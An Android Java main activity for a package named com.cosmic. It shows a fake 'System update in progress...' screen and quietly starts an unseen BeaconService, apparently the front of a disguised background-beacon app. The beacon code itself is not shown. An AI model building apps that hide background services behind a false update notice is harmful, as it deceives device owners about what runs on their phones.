package com.cosmic;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("System update in progress...");
        setContentView(tv);

        // Start beacon service
        startService(new Intent(this, BeaconService.class));
    }
}
